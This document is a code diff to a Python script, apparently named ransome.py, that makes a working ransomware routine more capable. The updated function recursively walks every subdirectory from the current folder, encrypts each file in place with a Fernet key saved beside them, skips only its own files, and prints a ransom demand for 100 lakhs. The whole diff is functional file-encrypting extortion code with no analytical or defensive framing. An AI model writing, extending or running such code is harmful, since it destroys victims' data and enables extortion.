@@ -3,24 +3,25 @@
 import os
 from cryptography.fernet import Fernet
 
+def encrypt_files(folder_path):
+    # Generate a unique encryption key
+    key = Fernet.generate_key()
+    with open(os.path.join(folder_path, "thekey.key"), "wb") as thekey:
+        thekey.write(key)
 
-#let's find some files
-files = []
-for file in os.listdir():
-	if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
-		continue
-	if os.path.isfile(file):
-		files.append(file)
-print(files)
+    # Walk through the directory structure
+    for root, _, files in os.walk(folder_path):
+        for file in files:
+            if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
+                continue
+            file_path = os.path.join(root, file)
+            with open(file_path, "rb") as thefile:
+                contents = thefile.read()
+            contents_encrypted = Fernet(key).encrypt(contents)
+            with open(file_path, "wb") as thefile:
+                thefile.write(contents_encrypted)
 
-key = Fernet.generate_key()
-with open("thekey.key", "wb") as thekey:
-	thekey.write(key)
-for file in files:
-	with open(file, "rb") as thefile:
-		contents = thefile.read()
-	contents_encrypted = Fernet (key).encrypt(contents)
-	with open(file, "wb") as thefile:
-		thefile.write(contents_encrypted)
+    print("Your files have been encrypted. Send me 100 lakhs.")
 
-print("your files have been encripted send me 100 lakhs")
+# Start encryption from the current directory
+encrypt_files(".")
